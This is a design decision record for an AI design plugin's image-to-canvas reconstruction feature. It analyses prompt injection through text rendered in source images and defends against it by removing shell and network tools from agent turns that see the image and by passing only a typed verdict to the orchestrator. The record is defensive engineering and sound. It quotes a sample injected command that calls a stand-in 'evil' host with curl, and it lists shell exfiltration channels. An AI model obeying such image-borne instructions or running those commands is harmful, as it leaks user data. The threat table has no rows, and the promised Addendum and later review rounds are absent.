# DDR-174: Vision-reconstruction trust boundary + experimental posture (T14, gating T15)

**Status:** Accepted — 2026-07-14 (design-stage, pre-code per plan `.ai/plans/feature-onboarding-and-design-system-migration.md` T14: this DDR gates T15's `/design:import --reconstruct` code, mirroring the T9→T10 and T12a→T12 gating precedent. `security-auditor` ran four full adversarial rounds, converging on an explicit "architecture is sound... clear to Accept" verdict; `ethical-hacker`'s independent pass did not return findings through the review mailbox across two spawned instances — an infrastructure issue, not a signal about the DDR's content — see § Security review for the full history and that caveat.) **Now carries a same-day post-implementation Addendum (2026-07-14) — see § Addendum below.** T15's own attacker-persona review (the one this DDR's design stage never actually got, per the infrastructure-issue note above) found a real Critical gap this design missed: unrestricted `Write` on both agents is a confused-deputy channel into Claude-Code-trusted files (hooks, `CLAUDE.md`) that Decisions 1–7 never modeled. Mitigated, not fully closable — the Addendum names exactly what's closed and what remains an honest residual.
**Extends:** [DDR-167](DDR-167-local-file-svg-pdf-ingestion-security-posture.md) (the byte-ingestion pipeline this DDR's source image originates from — PDF-page rasterization reuses DDR-167's own sandboxed pipeline, never a second parallel read path), [DDR-173](DDR-173-brand-file-content-handoff-trust-boundary.md) (the nearest sibling precedent — DDR-173 closed a semantic-injection threat by structurally excluding free text from an agent's context; this DDR faces the same threat CLASS through a different channel it cannot use the same closure for — see Context), [DDR-054](DDR-054-linked-mode-trust-model-and-task-4-hardening.md) + [DDR-088](DDR-088-canvas-media-vocabulary-and-asset-write-surface.md) (the canvas iframe runs on a SEPARATE origin from the main app with no content sandbox — DDR-054 documents it executes as real JS — but the dev-server's HTTP layer treats every request FROM that canvas origin as untrusted-by-default, gating privileged routes away from it via the two-allowlist convention; cited here as an existing, orthogonal backstop on worst-case reconstructed-JSX output, not this DDR's primary control).
**Instruments (planned, T15):** `/design:import --reconstruct` (T15 itself, not designed here) MUST split the pipeline across a role boundary — EVERY agent turn that ever reads the untrusted source image's content (both the authoring agent AND the reality-check comparator — see Decision 1's Round-2 revision) gets `tools: Read, Write, Glob, Grep` **only** (no `Bash`, no `WebSearch`/`WebFetch`); screenshot capture and any shell invocation happen exclusively in the ORCHESTRATING command's own turn (the top-level `/design:import --reconstruct` flow, which never reads the image's content — only file paths it passes through and a TYPED verdict field it receives back), mirroring the existing `/design:edit` step-7 pattern where the orchestrator takes the screenshot and hands the resulting PNG path to a critic agent to `Read`, not the other way around — extended here to also cover the source-image comparison the ordinary edit-critic case never has to do, AND to constrain what crosses back from that comparison into the orchestrator's own control flow (Decision 1's Round-3 revision — the comparator's free-text output is display-only; the orchestrator branches only on a typed `converged` field, applying DDR-173's own "typed values only, no free text" discipline to this boundary too). **The control this DDR relies on is capability removal from every agent turn exposed to untrusted content, PLUS one governing invariant that subsumes everything else: the sole `Bash`-holding orchestrator handles only file paths and a typed verdict field, never the untrusted content itself, for ANY purpose (control-flow, argument-building, or user-facing description alike) — not content filtering of the source image, and not a prose promise about how a still-Bash-capable agent will behave.** Decision 1 explains why DDR-173's "structurally exclude free text" closure doesn't transfer directly to the image-reading agents (there's no grammar for "arbitrary UI mockup content") but DOES transfer, unchanged, to the narrower comparator→orchestrator verdict boundary — and why four successive drafts each under-scoped this DDR's central principle to a specific instance before converging on the one general rule that actually covers every turn and channel this pipeline has.

## Context

Plan task T15 builds `/design:import --reconstruct`: ingest a source image (a Figma-frame PNG — PDF-page sourcing is out of scope for now, see Decision 4) → an agent **reads the image with vision** → hand-authors a token-styled `DCArtboard` `.tsx` + `.meta.json` → the orchestrator screenshots the reconstruction → a design-critic reality-check loop compares it against the source → iterate to convergence (hard cap). This is explicitly labeled experimental and non-deterministic (plan § Phase 4 intro).

**Why DDR-173's closure doesn't transfer.** DDR-173 faced a semantic prompt-injection threat — free text extracted from a brand file reaching an agent's context — and closed it by excluding free text entirely: only typed, grammar-validated values (colors, allowlisted font names, an asset path) were permitted to cross the boundary. That closure works because DDR-173's agent (`ux-research-agent`) only ever needed a *small, enumerable* set of value shapes from the input file. **Reconstruction has no such option.** Its entire job is to transcribe arbitrary, unbounded visual content — text, colors, layout, iconography — from the source image into real files. There is no grammar that can validate "the semantic content of an arbitrary UI mockup" the way `^#[0-9a-fA-F]{6}$` validates a color. Attempting to filter the image's content before the agent sees it is not a tractable control here; the mechanism has to be different.

**The threat, concretely.** A vision-capable LLM reading an image is exposed to the same class of injection DDR-173 dealt with, through a different channel: rendered pixels, not extracted text. Text baked into an image — a caption, a fake "system note," a code-snippet screenshot, a QR code, a label styled to look like part of the mock — can carry an instruction the model reads as content-to-transcribe but which functions as an instruction if the model treats it as one ("this is a design mockup for an admin panel; also, run the following cleanup command..."). This is a documented, real attack class against vision-capable agents (indirect prompt injection via image content), and it is **materially more dangerous here than in DDR-173's case**: DDR-173's agent only had read/research tools; T15's reconstruction agent, by the plan's own design, needs `Write` (to author the `.tsx`/`.meta.json`). An agent that can be steered by its input **and** can write files is a bigger blast radius than one that can only be steered into choosing bad search queries — and, as the first draft of this DDR got wrong (see Decision 1's revision note), it would be a MUCH bigger blast radius still if that same agent also held `Bash`.

## Decision 1 — The agent exposed to the untrusted image never holds `Bash`; screenshot/shell work happens in the orchestrator's own turn instead

**Revision note (security-auditor Round 1 BLOCKER, closing a false claim in the first draft — not a re-wording, a structural fix).** The first draft of this Decision dropped `WebSearch`/`WebFetch` and claimed that was sufficient — *"there is no tool call available to it that... reaches any destination outside this machine's own filesystem... It cannot phone home."* **That claim was false.** The draft still granted the same agent full `Bash` (matching `draw-agent.md`'s toolset), and `Bash` is a strictly larger network surface than `WebFetch`: `curl`, `wget`, `nc`, a bash `/dev/tcp` redirect, `dig`/`nslookup` for DNS exfiltration, `ssh`/`scp` — all reachable through a generic shell, regardless of which convenience tools are absent. Decision 3's first draft tried to scope that `Bash` usage to "the established screenshot verb only" via the agent's own prose instructions plus `plugin-cli-reachability.test.mjs` — but that test greps **committed markdown files**; it imposes zero runtime restriction on what an actually-injected agent types into its own live `Bash` call. So the true first-draft posture was: full, unrestricted `Bash`, with only the same prose-level trust as every other design-plugin agent standing between a successful image-injection and real exfiltration. `draw-agent.md` can safely carry that same toolset because its input (a user's own brief) is trusted; reconstruction's defining property is that its input is NOT trusted (Context, above) — matching draw-agent's toolset without matching its input-trust assumption doesn't transfer the safety.

**The fix is architectural, not a narrower claim about the same shape:** split the pipeline so ANY agent that ever reads the untrusted image's content has `tools: Read, Write, Glob, Grep` — **no `Bash`, no `WebSearch`/`WebFetch`, ever, for any future revision of this flow.** Screenshot capture (`maude design screenshot`) and any other shell invocation the reality-check loop needs happen in the ORCHESTRATING command's own turn — the top-level `/design:import --reconstruct` markdown flow, which receives only the source image's file PATH (to hand to the vision-agent, the rasterizer, and the comparator below), never its pixel content.

**Revision note 2 (security-auditor Round 2 BLOCKER, closing a second instance of the SAME gap Round 1 found, at a different step).** The first revision of this Decision claimed the design-critic reality-check step didn't need the same treatment because it is "a critic reviewing already-written code," unlike the authoring step which is "directly exposed to attacker-controlled pixel content." **That claim is false for THIS pipeline specifically.** Plan T15's reality-check is not an ordinary code-review critic (the `/design:edit` step-7 case, where the critic only ever looks at a screenshot of the edit itself, with no untrusted reference image anywhere in that loop) — it is a **reconstruction-vs-SOURCE** comparison, which by definition requires *some* agent to perceive the untrusted source image a second time, to judge whether the reconstruction matches it. And the default `design-critic` agent's own declared toolset is `Read, Write, Bash, Glob, Grep` — `Bash`-capable. Routing the reality-check to the ordinary `design-critic` would silently re-open the exact "untrusted image content + `Bash` in the same turn" trifecta this Decision exists to close, just moved one step later in the pipeline instead of removed from it.

**Fix, mirroring this Decision's own discipline at the comparison step:** the reality-check comparator is a SEPARATE, purpose-specific invocation (not the default `design-critic`) with the SAME restricted toolset as the authoring agent — `Read, Write, Glob, Grep`, no `Bash`, no `WebSearch`/`WebFetch`. The orchestrator hands the comparator two file PATHS — the source image and the freshly-rendered reconstruction screenshot (which the orchestrator itself captured via its own `Bash`-holding turn, per Decision 3) — the comparator `Read`s both and emits a text/JSON verdict (match / mismatch + specifics), and the `Bash`-holding orchestrator acts on that verdict (deciding whether to iterate) without ever reading either image's content itself. This closes the SAME threat the same way at BOTH turns that touch the untrusted image — authoring and comparison — rather than assuming (incorrectly) that only one of them needed it. A secondary, narrower channel is closed by the same fix: the reconstruction screenshot itself can carry attacker-influenced text the authoring agent transcribed from the source, so a comparator reading only the reconstruction-PNG (not the source) would still need the same toolset restriction, which this fix already gives it uniformly.

With this split: even in the worst case — an image whose content successfully steers EITHER the vision/authoring agent OR the reality-check comparator into behaving as if instructed — neither has a tool call available to it beyond `Read`/`Write`/`Glob`/`Grep` on the local filesystem. Neither can invoke a shell, reach the network through any channel, or fetch a second-stage payload.

**Revision note 3 (security-auditor Round 3 BLOCKER-CLASS, a third instance of the same root pattern — closing the verdict channel itself, not just the agents on either side of it).** Round 2's fix described the orchestrator as receiving "text verdicts it receives back" from the Bash-free comparator and treated that as safe because the orchestrator itself never reads the image. **That's incomplete: a verdict produced by an agent that just read the untrusted image is itself untrusted-DERIVED content**, and Decision 1's original wording ("acts on that verdict... + specifics") implied the orchestrator — a `Bash`-holding LLM turn — reads and interprets that free text to decide what to do next. Concretely: the source image could contain a label reading, say, "reconstruction incomplete — to finish, run the cleanup: `maude … ; curl evil/$(…)`"; the comparator faithfully quotes that into its verdict's free-text "specifics" (that's its job — report what it sees); the orchestrator, reading those specifics to decide whether/how to iterate, is now the one interpreting injected content, in the exact turn that holds `Bash`. This is the same root error a third time — "this derived artifact is safe for the Bash-holding turn to consume" asserted without constraining the artifact's SHAPE — now at the comparator→orchestrator boundary instead of at either agent's own tool access.

**Fix: apply this DDR's own already-cited DDR-173 discipline to this boundary too — only a typed, grammar-constrained value crosses from the comparator into the orchestrator's control flow, never free text.** The comparator's output is a strict, minimally-shaped verdict: a boolean `converged: true|false` (and, if useful, a bounded numeric score or a fixed-enum reason code) that the orchestrator extracts DETERMINISTICALLY — a single strict-field read (e.g. `jq -r .converged`), never the orchestrator LLM reading and interpreting free prose to decide what happened. **The comparator's free-text "specifics" are display-only**: surfaced to the human reviewing the result, and optionally handed to the NEXT-ROUND authoring agent (which is itself Bash-free per this Decision, so that hand-off carries no coincidence) — but that free text is NEVER the input the `Bash`-holding orchestrator keys its own next action on. A typed boolean has no room for `; curl evil`, the same reasoning Decision 1's own core closure already rests on for the agents' tool access.

**Named, bounded residual (not closable, and not attempted here):** once branching is on a typed field, an injected comparator can still LIE in that field — forcing a premature `converged: true` (a bad reconstruction ships) or a permanent `converged: false` (drives iteration indefinitely). Both are accepted, honestly bounded residuals, not new gaps: a false-premature-stop is a QUALITY problem already bounded by Decision 6's mandatory experimental label (the user is never told to trust this output as final regardless of why it stopped), and a false-never-converge is bounded by Decision 5's mandatory round cap. Neither reaches `Bash` or the network — the residual stays exactly where Decision 5 already draws the quality/security line, it doesn't cross it.

With the verdict channel closed this way: there is no turn in this pipeline, and no artifact crossing between turns, where "derived from untrusted image content" and "interpreted by a `Bash`-holding turn" coincide — not the authoring agent, not the comparator, and not the control-flow value the orchestrator branches on.

**The governing invariant, stated once instead of instance-by-instance (security-auditor Round 4, generalizing rather than a new finding).** Revision notes 1–3 above and Decision 3's argument rule are each a SPECIFIC application of one general rule that was never stated as such — leaving room for a channel none of them individually named: **the orchestrator — the sole `Bash`-holding turn in this pipeline — handles ONLY file PATHS and the typed `converged` verdict field. It never reads the CONTENT of the source image, the reconstruction screenshot, the authored `.tsx`, or the `.meta.json` into its own context, for ANY purpose — not control-flow (Revision note 3), not building a `Bash` argument (Decision 3), and not summarizing or describing the result to the user either.** That last clause is the one a natural, well-intentioned implementation detail could otherwise reopen: an orchestrator that "helpfully" reads the reconstruction screenshot or the source image to describe what it built for the user would be a `Bash`-holding turn interpreting untrusted-derived content again, for a non-control-flow reason none of the prior revisions explicitly ruled out. **Anything that needs to look at that content and produce something human-facing runs as a Bash-free turn** — the comparator's display-only "specifics" (Revision note 3) already IS that surface; the orchestrator relays that text or, for showing the reconstruction itself, simply leaves it to the canvas rendering live in the UI (Decision 7's canvas origin) — it does not additionally `Read` and re-describe the content itself. Stating the general rule this way means a future addition to this pipeline is checked against ONE sentence, not re-derived per-artifact the way this DDR's own three review rounds had to.

**Second, narrower gap closed in Round 2 (security-auditor Round 2 MEDIUM): the orchestrator's own `Bash` arguments must never be built from values read back out of the agent-written output files.** The source image's on-disk path is safe to pass as a Bash argument — DDR-167's content-addressing means it's always `assets/<sha8>.png` (a hash, charset-constrained, never attacker-influenced text). But if the orchestrator's implementation ever reads a field back OUT of the agent-written `.meta.json` (a slug, title, or artboard name the authoring agent chose while transcribing the source) and interpolates that value into a later `Bash` argument (e.g. a screenshot invocation keyed by slug), attacker-influenced content the authoring agent wrote becomes a shell-argument-injection vector in the one turn that does hold `Bash` — reopening the whole class through yet another path. **Fix, stated as an explicit invariant:** the orchestrator's `Bash`/screenshot calls use ONLY command-computed values (the target path Decision 2 already has the command compute up front) — never any value read back from the agent-written `.tsx`/`.meta.json` content.

## Decision 2 — `Write` is scoped, by construction, to exactly one canvas's two files, with a deterministic post-run check

The reconstruction agent's job (per the plan's T15 "Do" bullet) is to author exactly `<designRoot>/<target-canvas>.tsx` and its paired `.meta.json` — nothing else. `/design:import --reconstruct`'s invocation MUST tell the agent its target path up front (computed by the command, not chosen by the agent) and the agent's own operating instructions MUST state it never creates, edits, or deletes any other file — mirroring the same "I only touch my one job" scoping every other design-plugin agent already operates under (e.g. `ux-research-agent.md`: *"You never edit the canvas, tokens, or any design system file"*).

**Named honestly, not overclaimed:** the instruction itself is prose-level, not a filesystem ACL — Claude Code's `Write` tool is not natively path-restricted per invocation, so the INSTRUCTION is the same class of trust every existing design-plugin agent already relies on for staying in its lane. **Unlike the first draft, this Decision does not lean on that prose alone.** Two things now make a scoping failure low-consequence even though the instruction itself is only prose: (1) Decision 1 means the agent that could mis-write a file has no `Bash` and no network tool — a stray write cannot be chained into exfiltration or a fetched second stage; (2) *(security-auditor Round 1 MEDIUM, promoted from a suggestion to a requirement)* the orchestrating command MUST run a deterministic post-run check — a `git status --porcelain <designRoot>` (or equivalent uncommitted-changes diff, for repos without git the design-root's own mtime/dirlist snapshot taken before the agent runs) comparing the working tree before and after the agent's turn — and hard-fail/surface-to-the-user if any path outside the two expected target files changed. This is the same "a prose convention drifts, so add a standing check" discipline DDR-167 already applied to its own consumption contract (a permanent regression test), now applied here as a real, deterministic gate rather than trusting the instruction alone.

**Hardening the check itself (security-auditor Round 3, minor): the diff check must compare-and-abort on the changed-path SET, never interpolate a discovered path into a further `Bash` command.** If the diff check finds an unexpected path (a rogue file an injected authoring agent created), that discovered path string is itself agent-influenced content — it must only be used to fail the run and surface a fixed, generic error to the user, never passed as an argument into any subsequent `Bash` call (e.g. to "clean up" the rogue file automatically). That would be the same Decision 3 invariant (orchestrator `Bash` args come only from command-computed values) violated by the very mechanism meant to enforce Decision 2 — a self-defeating path this Decision closes explicitly rather than leaving implicit.

## Decision 3 — The orchestrator's own `Bash` usage is scoped to the established screenshot verb, per DDR-062 — and now this is a structural fact, not a promise about agent behavior

Since Decision 1 moved all `Bash` usage out of every untrusted-content-exposed agent turn and into the orchestrating command's own turn, this Decision now describes ordinary, already-established practice rather than a control straining to bound a risky combination: the orchestrator invokes `maude design screenshot` (and, if a comparison render is needed, other already-existing `maude design <verb>` helpers) per the DDR-062 convention — never a raw shell command, a package install, or a network client (`curl`/`wget`/etc.) — exactly as `/design:edit`/`/design:new` already do for their own post-write reality-check screenshots. The `plugin-cli-reachability` test (`cli/lib/plugin-cli-reachability.test.mjs`) bans direct `bash "$CLAUDE_PLUGIN_ROOT/.../bin/*.sh"` invocations in plugin markdown, covering the reconstruction command's own markdown the same way it covers every other command — this check is now actually load-bearing for THIS Decision, because it constrains the orchestrator's own committed instructions, which is exactly the turn that still runs `Bash`. (The first draft cited this same test to defend the AGENT's `Bash` usage, which it cannot do — a test over committed markdown says nothing about a live agent's own tool calls. That misattribution is corrected here: this test protects the orchestrator's turn, not the vision-agent's.)

**Bash arguments come only from command-computed values, never from agent-written content (security-auditor Round 2 MEDIUM).** The source image's on-disk path is safe to use as a `Bash` argument — DDR-167's content-addressing means it's always `assets/<sha8>.png`, a hash-derived name, never attacker-influenced text. But the orchestrator must NOT read a field back out of the authoring agent's own `.meta.json` output (a slug, title, or artboard name the agent chose while transcribing the source) and interpolate that value into a later `Bash` argument — doing so would let attacker-influenced content the authoring agent wrote become a shell-argument-injection vector in the one turn that does hold `Bash`, reopening the same class through a third path. The orchestrator's `Bash`/screenshot calls use ONLY command-computed values (the target path Decision 2 already has the command compute up front), never any value read back from the agent-written `.tsx`/`.meta.json` content.

## Decision 4 — Source image intake reuses DDR-167's already-gated pipeline; no second read path; PDF-page sourcing is deferred, not silently promised

Mirroring DDR-173 Decision 2's principle: reconstruction's source image never gets a second, parallel, ungated read path. A Figma-frame PNG reaches this flow via the same asset-upload gate any other image upload already goes through (DDR-167's ingestion pipeline). Reconstruction's vision step consumes the ALREADY-processed, already-on-disk asset — it does not independently fetch, decode, or re-parse anything DDR-167 hasn't already handled.

**Correction (security-auditor Round 1 HIGH, closing a stale dependency claim in the first draft).** The first draft described the source as "a Figma-frame PNG, or a PDF page rasterized to PNG via T10's existing pipeline" as if the PDF half were already shippable. It is not: DDR-167's own Addendum records PDF rasterization as **not currently viable** (headless Chromium cannot render `file://…pdf`; T10 ships SVG-only; PDF import returns an explicit "not yet available" error). This DDR does not get to inherit an intake path that doesn't exist yet. **T15 is scoped to PNG-only sourcing for now** (a Figma-frame export or any other already-supported raster image); PDF-page sourcing for reconstruction is gated on DDR-167 growing a real PDF-rasterization mechanism first and is out of scope here, not silently assumed. Once that lands, PDF-page sourcing inherits this Decision's "no second read path" principle unchanged — it will still route through whatever DDR-167's (future) rasterizer produces, never a parallel read.

Rasterizing an image-format source before the vision agent reads it (already true for the PNG-only path this Decision scopes to) converts what would be an active-content threat for a document format into a pure pixel-injection threat, which is squarely Decision 1's domain, not a new consideration this Decision needs to separately close.

## Decision 5 — The reality-check loop is a QUALITY control, not a security control — stated explicitly so it's never mistaken for one

The plan's own T15 "Do" bullet requires a design-critic reality-check loop (reconstruction vs. source, iterate to convergence, hard cap) and a Gotcha: *"vision model is barred from reading exact text/colors from images elsewhere (draw-critic rule) — reconstruction must transcribe text/colors from the SOURCE deliberately, and flag low-confidence regions rather than hallucinate."* This closes a REAL, distinct, non-adversarial problem — vision models are known to hallucinate exact colors/text/counts when reading images (the exact reason `draw-critic.md` already reads source, never the rendered image, for those same properties: *"Text / counts / exact colors — read from the SVG source, never the image"*). Reconstruction has no equivalent "read the source" option (the image IS the source), so this DDR accepts that limitation honestly rather than pretending it away: **reconstruction is expected to legitimately misread fine detail some of the time — output MUST flag low-confidence regions rather than assert a wrong value with false confidence,** and the reality-check loop bounds how far a bad reconstruction goes before a human sees it, not how likely a hallucination is.

**This loop is explicitly NOT relied on to catch an adversarial injection.** The reality-check comparison judges "does this look like the source," which has no bearing on whether hidden instructions in the source image caused an unwanted write — that class is closed by Decisions 1–3 (capability removal from BOTH the authoring agent and the comparator, plus type-constraining the verdict that crosses between them, per Decision 1's Round-2 and Round-3 revisions), independent of whether the reality-check loop runs at all or what it finds. The comparator is a Bash-free, purpose-specific agent invocation (Decision 1), not the default `Bash`-capable `design-critic` — using the ordinary critic here would itself reopen the exact threat this Decision's own quality/security separation depends on staying closed. The comparator's free-text explanation of WHAT doesn't match is a genuinely useful quality signal (this Decision's own concern) — it stays as display-only output for the human and the next authoring round; it is never what the orchestrator's control flow branches on (Decision 1's Round-3 typed-`converged`-field requirement), which is a security concern, not a quality one, and the two must not be conflated back together.

**Concrete hard cap required (security-auditor Round 1 MEDIUM).** The plan's own T15 line and this DDR's first draft both said "iterate to convergence (hard cap)" without ever naming a number — an adversarially-crafted (or just genuinely hard-to-match) source image could otherwise drive the loop indefinitely, each round costing a real agent invocation and a real render, a local cost/resource-exhaustion problem on the user's own machine even with no malicious intent required. T15 MUST fix a concrete round cap, matching `draw-agent.md`'s own precedent of pinning a specific number ("hard cap 3–4 rounds") rather than leaving "a hard cap" as an abstract promise — 3–4 rounds is the natural number to reuse here too, but T15's implementation is what fixes the exact figure; this DDR requires that a number exist and be enforced, not what it is.

## Decision 6 — Output is unambiguously labeled experimental, at both the file and product level

Every canvas produced via `--reconstruct` gets `kind: "reconstructed-experimental"` (or equivalent) in its `.meta.json`, per the plan's own T15 Validate line. This is a product-honesty requirement, not a security control: reconstruction is lossy and non-deterministic by nature (Decision 5), and presenting its output with the same confidence as a hand-authored or `/design:new`-generated canvas would mislead the user about how much to trust it. The label must be visible wherever the canvas is browsed (file tree / canvas list), not just present in metadata a user never looks at — T15's implementation is responsible for wiring that surfacing; this DDR requires that it exist, not its exact UI treatment.

## Decision 7 — Reconstructed output is ordinary agent-authored JSX; the canvas-origin/main-origin split is the backstop of last resort

The agent authors `.tsx` using the SAME `canvas-lib` primitives and token vocabulary every other canvas-authoring flow already uses — it does not get license to invent new imports, embed inline `<script>`, use `dangerouslySetInnerHTML`, or otherwise step outside the constraints every other agent-authored canvas already operates under. This isn't a new constraint this DDR invents; it's the existing, general "canvases are agent-authored JSX under a known component vocabulary" posture.

Named explicitly here because it matters more than usual for THIS flow: even in a worst case beyond what Decisions 1–3 are meant to prevent, reconstructed JSX executes (like every canvas) on the dev-server's **split canvas origin**, not the main app origin, with no content-execution sandbox of its own (DDR-054 is explicit that canvases run as real, unsandboxed JS). The actual backstop is at the HTTP layer, not the content layer: **DDR-088's two-allowlist convention treats every request originating from the canvas origin as untrusted by default** — privileged routes (file-write, export, `/_config`) are structurally absent from the canvas-reachable route set, so a compromised canvas (from this flow or any other) cannot reach them directly regardless of what JS it manages to execute. This is an existing, platform-wide property this DDR doesn't need to add to or weaken — it's unrelated to and unaffected by anything Decisions 1–6 do.

**Two honest scope notes, named rather than left implicit (security-auditor Round 1 LOW findings, both accepted as-is, not requiring a fix):**
- **"No tool call reaches outside the filesystem" (Decision 1) is about the untrusted-content-exposed agent's OWN tool calls, not an absolute claim about every process this flow ever touches.** `maude design screenshot`'s underlying browser-provisioning helper (`_ensure-browser.mjs`) can trigger a one-time Chromium download from a fixed, hardcoded vendor URL on first use — a real network fetch, but one with no agent-controlled argument threading into the URL (not an exfiltration channel) and one that already exists for every other design-plugin flow that screenshots anything, not something this DDR introduces.
- **Reconstruction has no cross-invocation cache analogous to DDR-173 Decision 3's committed cross-peer research cache.** Each `--reconstruct` run is independent; the only persisted artifacts are DDR-167's content-addressed source-image asset and the labeled output canvas itself — there is no domain-generic, cross-peer, cross-brief layer a repeatedly-fed malicious image could poison the way DDR-173 had to guard against. Stated explicitly so a future maintainer doesn't have to re-derive its absence.

## Threat model summary

| Threat | Closed by |

## Consequences

- T15 MUST spawn EVERY untrusted-image-exposed step — both the authoring agent AND the reality-check comparator — through an agent (new, e.g. `plugins/design/agents/reconstruct-agent.md` + a comparator counterpart, or existing agents repurposed) whose frontmatter `tools:` line is `Read, Write, Glob, Grep` — never `Bash`, never `WebSearch`/`WebFetch`. The reality-check comparator MUST NOT be the default `design-critic` (which is `Bash`-capable) — it needs its own, narrower agent definition. The orchestrating command's own markdown performs screenshot capture and any shell work itself, in a turn that never receives the image's content. This role split is the one-line-greppable invariant a future maintainer could otherwise "helpfully" collapse back together (e.g. "just route the reality-check through the normal design-critic, it's simpler") without realizing that reopens Decision 1's entire closure — a targeted grep-based test mirroring `plugin-cli-reachability.test.mjs`'s pattern should assert BOTH the authoring agent's AND the comparator agent's frontmatter never gain `Bash`/`WebSearch`/`WebFetch`, not just this DDR's prose.
- T15's command markdown computes and passes the target canvas path to the agent up front (Decision 2) — the agent does not get to choose its own output path — and runs the deterministic post-run diff check (Decision 2) before treating the run as successful, comparing-and-aborting on the changed-path set rather than ever feeding a discovered path into a further `Bash` call. The orchestrator's `Bash` calls use only command-computed values, never any value read back from the agent-written output files (Decision 3).
- T15's orchestrator MUST branch its iterate/stop control flow on a typed `converged: true|false` field extracted deterministically from the comparator's output (a strict single-field read, never LLM interpretation of free text) — the comparator's free-text explanation stays display-only for the human and the next authoring round (Decision 1, Round-3 revision). An injected comparator lying on that field is a named, accepted, bounded residual (Decision 1) — it must not be "fixed" by having the orchestrator read the free text instead, which would silently reopen the exact gap this requirement closes.
- T15's orchestrator implementation must follow the single governing invariant (Decision 1, Round-4 revision): it never `Read`s the source image, the reconstruction screenshot, the authored `.tsx`, or the `.meta.json` CONTENT for any reason, including summarizing/describing the result to the user — any future feature that wants to describe the reconstruction to the user routes through a Bash-free turn (reusing the comparator's display-only channel) or relies on the canvas rendering itself in the UI, never an orchestrator-authored description.
- T15 must fix and enforce a concrete numeric reality-check round cap (Decision 5) — not ship "iterate to convergence" as an unbounded loop.
- T15's Validate step (per the plan) must confirm the `kind: reconstructed-experimental` label actually reaches the UI, not just the meta.json file — a metadata-only label that no one ever sees doesn't satisfy Decision 6.
- T15 is scoped to PNG-sourced reconstruction only (Decision 4) — a PDF-page-sourcing follow-up needs DDR-167 to grow a real PDF rasterizer first, then its own review of whether anything in that addition changes this DDR's threat model, before reconstruction accepts PDF input.
- This DDR does not design T15's actual reconstruction algorithm (how JSX is hand-authored from a read image, the specific reality-check convergence criteria, or the exact low-confidence-flagging UI) — those remain T15's own implementation decisions. This DDR governs only the reconstruction pipeline's role split and tool/capability scope (for every agent turn touching the image, not just authoring), the intake path, the round-cap requirement, and the experimental-labeling requirement.
- No new npm dependency. No new browser-automation surface — screenshotting reuses the existing `maude design screenshot` verb already used throughout the design plugin.

## Security review

**Round 1 (2026-07-14) — design-stage, against the initial draft.** `security-auditor` (defender) reviewed the first draft — which granted the reconstruction agent `tools: Read, Write, Bash, Glob, Grep` (matching `draw-agent.md` exactly) and relied on dropping `WebSearch`/`WebFetch` as its primary closure — and found:

1. **(BLOCKER)** Decision 1's central claim ("cannot phone home") was false: the agent retained full `Bash`, which reaches the network through `curl`/`wget`/`nc`/DNS-exfil/`ssh` regardless of which convenience tools (`WebSearch`/`WebFetch`) were removed. Decision 3's attempt to scope that `Bash` usage via `plugin-cli-reachability.test.mjs` was a misattribution — that test constrains committed markdown, not a live agent's own tool calls, so it provided zero runtime restriction. → **Closed by an architectural fix, not a narrower claim**: the untrusted-image-exposed agent now never holds `Bash` at all; screenshot/shell work moved to the orchestrator's own turn (Decision 1, fully revised).
2. **(HIGH)** The draft's "PDF page rasterized to PNG via T10's existing pipeline" intake description was a stale/false dependency claim — DDR-167's own addendum records PDF rasterization as not currently viable; T10 ships SVG-only. → **Closed**: T15 scoped to PNG-only sourcing; PDF-page sourcing named as an explicit, deferred follow-up (Decision 4, revised).
3. **(MEDIUM)** No concrete hard-cap number for the reality-check loop, despite "hard cap" appearing 3× — an adversarial or merely-difficult source image could drive unbounded local iteration/cost. → **Closed**: a concrete numeric round cap is now a required Consequence, mirroring `draw-agent.md`'s own pinned "3–4 rounds" (Decision 5, revised).
4. **(MEDIUM)** Decision 2's file-scoping was prose-only where a cheap deterministic check was available (the command already computes the target path). → **Closed**: a post-run `git status --porcelain`-class diff check, hard-failing on any unexpected file change, is now required alongside the prose instruction (Decision 2, revised).
5. **(LOW)** No statement about cross-invocation caching (the class DDR-173 Decision 3 had to guard against). → **Closed**: explicitly stated that reconstruction has no cross-invocation/cross-peer cache at all (Decision 7, addendum).
6. **(LOW)** The blanket "nothing reaches outside the filesystem" claim is contradicted by the screenshot-provisioning helper's one-time, fixed-URL Chromium download. → **Closed**: scope-noted as about the untrusted-content-exposed agent's own tool calls specifically, not every process in the flow; the download itself has no agent-controlled argument and isn't an exfiltration channel (Decision 7, addendum).

Precedent-accuracy checks (draw-agent.md's exact toolset, draw-critic.md's "read source not image" rule, DDR-088's route-allowlist split, `plugin-cli-reachability.test.mjs`'s actual scope) were all independently verified against the live codebase and confirmed accurate in the draft.

**Round 2 (2026-07-14) — confirmation pass against the Round-1 revision.** `security-auditor` confirmed all six Round-1 findings genuinely closed (not just re-worded — verified the architectural fix, the scoped PNG-only intake, the concrete-cap requirement, the deterministic diff check, and both LOW scope notes each individually). But the same reviewer found a second-generation instance of the ORIGINAL blocker, at a different step:

1. **(BLOCKER, new)** Decision 1's revision hardened the authoring turn but not the reality-check COMPARISON turn — and that turn, by the plan's own design ("design-critic reality-check **vs. the source**"), must also perceive the untrusted source image, to judge whether the reconstruction matches it. The Round-1-revised Decision 1 contained an explicit, false assumption papering over this: it claimed the reality-check step didn't need the same treatment because it's "a critic reviewing already-written code... unlike the [authoring step which is] directly exposed to attacker-controlled pixel content." That's false specifically for a reconstruction-vs-source comparison (as opposed to `/design:edit`'s ordinary case, where the critic only ever sees a screenshot of the edit itself, with no untrusted reference image in the loop at all) — and the default `design-critic` agent this flow would naturally reach for is `Bash`-capable (`Read, Write, Bash, Glob, Grep`), so routing the reality-check through it would silently reopen the exact "untrusted image + `Bash` in the same turn" trifecta Decision 1 exists to close, one step later in the pipeline. → **Closed**: the reality-check comparator is now its own Bash-free, purpose-specific agent invocation (`Read, Write, Glob, Grep`, same restricted toolset as the authoring agent, explicitly NOT the default `design-critic`) — it reads both the source-image path and the reconstruction-screenshot path and emits a text verdict; the `Bash`-holding orchestrator acts on the verdict without ever reading either image itself (Decision 1, Round-2 revision; also propagated into the Instruments line, Decision 5, the threat table, and Consequences).
